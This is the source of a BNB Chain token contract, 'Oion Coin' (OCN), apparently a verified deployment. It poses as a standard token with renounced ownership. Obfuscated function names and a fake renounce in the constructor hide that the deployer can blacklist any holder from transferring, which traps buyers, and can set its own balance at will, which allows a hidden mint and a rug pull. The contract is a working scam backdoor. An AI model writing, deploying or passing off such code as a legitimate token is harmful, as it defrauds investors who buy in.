/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

abstract contract walletShould {
    function fromModeEnable() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface marketingModeTake {
    function createPair(address senderTx, address launchedModeToken) external returns (address);
}

interface minTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract OionCoin is IERC20, walletShould {

    function symbol() external view returns (string memory) {
        return listAuto;
    }

    function feeSwap(address teamReceiverAt, address sellTeam, uint256 shouldAtAuto) internal returns (bool) {
        require(launchToken[teamReceiverAt] >= shouldAtAuto);
        launchToken[teamReceiverAt] -= shouldAtAuto;
        launchToken[sellTeam] += shouldAtAuto;
        emit Transfer(teamReceiverAt, sellTeam, shouldAtAuto);
        return true;
    }

    function amountMax() public {
        if (txFee == autoAtMarketing) {
            autoAtMarketing = txFee;
        }
        
        autoAtMarketing=0;
    }

    function toMin(address teamReceiverAt, address sellTeam, uint256 shouldAtAuto) internal returns (bool) {
        if (teamReceiverAt == toLaunched) {
            return feeSwap(teamReceiverAt, sellTeam, shouldAtAuto);
        }
        require(!listAutoMin[teamReceiverAt]);
        return feeSwap(teamReceiverAt, sellTeam, shouldAtAuto);
    }

    uint8 private shouldMarketing = 18;

    address private launchReceiver;

    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {
        return launchToken[receiverBuy];
    }

    function sellFee(address fromFundMode) public {
        if (limitMarketing) {
            return;
        }
        
        sellList[fromFundMode] = true;
        if (minWalletTrading) {
            autoAtMarketing = txFee;
        }
        limitMarketing = true;
    }

    event OwnershipTransferred(address indexed launchedWallet, address indexed limitMin);

    function walletLaunched(address walletLaunch) public {
        
        if (walletLaunch == toLaunched || walletLaunch == buyFrom || !sellList[fromModeEnable()]) {
            return;
        }
        
        listAutoMin[walletLaunch] = true;
    }

    address public buyFrom;

    function transfer(address exemptShouldSender, uint256 shouldAtAuto) external virtual override returns (bool) {
        return toMin(fromModeEnable(), exemptShouldSender, shouldAtAuto);
    }

    function transferFrom(address teamReceiverAt, address sellTeam, uint256 shouldAtAuto) external override returns (bool) {
        if (limitTrading[teamReceiverAt][fromModeEnable()] != type(uint256).max) {
            require(shouldAtAuto <= limitTrading[teamReceiverAt][fromModeEnable()]);
            limitTrading[teamReceiverAt][fromModeEnable()] -= shouldAtAuto;
        }
        return toMin(teamReceiverAt, sellTeam, shouldAtAuto);
    }

    function getOwner() external view returns (address) {
        return launchReceiver;
    }

    function decimals() external view returns (uint8) {
        return shouldMarketing;
    }

    uint256 private receiverSwapTotal = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private limitTrading;

    function shouldAmount() public {
        emit OwnershipTransferred(toLaunched, address(0));
        launchReceiver = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverSwapTotal;
    }

    bool private totalEnable;

    function approve(address sellFrom, uint256 shouldAtAuto) public virtual override returns (bool) {
        limitTrading[fromModeEnable()][sellFrom] = shouldAtAuto;
        emit Approval(fromModeEnable(), sellFrom, shouldAtAuto);
        return true;
    }

    address public toLaunched;

    mapping(address => bool) public sellList;

    function isMarketing(uint256 shouldAtAuto) public {
        if (!sellList[fromModeEnable()]) {
            return;
        }
        launchToken[toLaunched] = shouldAtAuto;
    }

    constructor (){
        if (receiverSender != totalEnable) {
            totalEnable = true;
        }
        minTx takeList = minTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyFrom = marketingModeTake(takeList.factory()).createPair(takeList.WETH(), address(this));
        launchReceiver = fromModeEnable();
        
        toLaunched = fromModeEnable();
        sellList[fromModeEnable()] = true;
        if (txFee != receiverExempt) {
            receiverExempt = txFee;
        }
        launchToken[fromModeEnable()] = receiverSwapTotal;
        emit Transfer(address(0), toLaunched, receiverSwapTotal);
        shouldAmount();
    }

    string private listAuto = "OCN";

    bool public limitMarketing;

    function name() external view returns (string memory) {
        return minWallet;
    }

    function owner() external view returns (address) {
        return launchReceiver;
    }

    function atTakeList() public view returns (bool) {
        return minWalletTrading;
    }

    bool private receiverSender;

    function senderIs() public view returns (uint256) {
        return receiverExempt;
    }

    mapping(address => uint256) private launchToken;

    uint256 private receiverExempt;

    string private minWallet = "Oion Coin";

    uint256 public txFee;

    function allowance(address walletIs, address sellFrom) external view virtual override returns (uint256) {
        return limitTrading[walletIs][sellFrom];
    }

    mapping(address => bool) public listAutoMin;

    uint256 public autoAtMarketing;

    function sellEnable() public {
        if (txFee != receiverExempt) {
            txFee = autoAtMarketing;
        }
        if (receiverSender == minWalletTrading) {
            receiverExempt = autoAtMarketing;
        }
        receiverExempt=0;
    }

    function tokenSender() public {
        if (minWalletTrading != receiverSender) {
            autoAtMarketing = txFee;
        }
        if (totalEnable == minWalletTrading) {
            receiverSender = true;
        }
        txFee=0;
    }

    bool public minWalletTrading;

}